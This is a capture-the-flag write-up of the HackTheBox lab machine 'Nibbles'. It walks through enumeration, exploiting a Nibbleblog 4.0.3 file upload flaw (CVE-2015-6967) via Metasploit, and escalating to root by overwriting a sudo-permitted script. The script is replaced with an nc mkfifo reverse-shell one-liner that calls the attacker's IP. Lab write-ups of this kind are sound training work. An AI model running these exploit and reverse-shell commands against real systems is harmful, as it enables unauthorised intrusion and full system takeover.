---
layout: post
title: "HTB - Nibbles"
date: 2026-11-18
categories: [HackTheBox, Linux]
tags: [htb, writeup, linux, nibbleblog, file-upload, cve-2015-6967, sudo, privesc]
---

# Enumeration

Initial scan reveals only two open ports: SSH and HTTP.

```bash
sudo nmap -p- 10.129.132.101 -vvv --min-rate 1000 -Pn
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

The HTTP server hosts a Nibbleblog installation at `/nibbleblog/`. Directory brute-force reveals the application structure:

```bash
ffuf -c -w ~/tools/SecLists/Discovery/Web-Content/raft-large-directories-lowercase.txt \
     -u http://10.129.132.101/nibbleblog/FUZZ -fw 22

themes    [Status: 301]
content   [Status: 301]
languages [Status: 301]
plugins   [Status: 301]
admin     [Status: 301]
```

## Information Disclosure via config.xml

Nibbleblog exposes its configuration file without authentication:

```
http://10.129.132.101/nibbleblog/content/private/config.xml
```

```xml
<notification_email_to type="string">admin@nibbles.com</notification_email_to>
<seo_site_title type="string">Nibbles - Yum yum</seo_site_title>
```

The admin username is confirmed as `admin`. A second ffuf pass against `common.txt` locates the login panel:

```bash
ffuf -c -w ~/tools/SecLists/Discovery/Web-Content/common.txt \
     -u http://10.129.132.101/nibbleblog/FUZZ

admin.php   [Status: 200, Size: 1401]
README      [Status: 200, Size: 4628]
```

The `README` file discloses the installed version: **Nibbleblog 4.0.3**.

---

# Foothold

## CVE-2015-6967 — Nibbleblog 4.0.3 Arbitrary File Upload

Nibbleblog 4.0.3 allows an authenticated administrator to upload arbitrary files through the My Image plugin. The application performs no server-side validation on file type, permitting upload of PHP files directly to a web-accessible path.

The admin panel is accessible at `/nibbleblog/admin.php`. The password `nibbles` (derived from the machine name) grants access.

Exploiting with Metasploit:

```bash
use exploit/multi/http/nibbleblog_file_upload
set RHOSTS 10.129.132.101
set USERNAME admin
set PASSWORD nibbles
set TARGETURI /nibbleblog/
set LHOST 10.10.15.140
run
```

```
[*] Started reverse TCP handler on 10.10.15.140:4444
[*] Sending stage (40004 bytes) to 10.129.132.101
[+] Deleted image.php
[*] Meterpreter session 1 opened
```

```bash
meterpreter > shell
whoami
nibbler
```

Shell obtained as `nibbler`.

---

# Privilege Escalation

## Writable Sudo Script

The user's home directory contains a ZIP archive:

```bash
ls /home/nibbler
personal.zip  user.txt

unzip personal.zip
  inflating: personal/stuff/monitor.sh
```

Checking sudo permissions:

```bash
sudo -l
User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
```

`nibbler` can execute `monitor.sh` as root without a password, and the file is owned by `nibbler` — full write access. Overwriting it with a reverse shell payload:

```bash
echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.15.140 9001 >/tmp/f' \
     > /home/nibbler/personal/stuff/monitor.sh
```

Start a listener and trigger execution:

```bash
# attacker
nc -lnvp 9001
```

```bash
# victim
sudo /home/nibbler/personal/stuff/monitor.sh
```

```
connect to [10.10.15.140] from (UNKNOWN) [10.129.132.101] 42426
# whoami
root
# cat /root/root.txt
f7199adb87575146
```
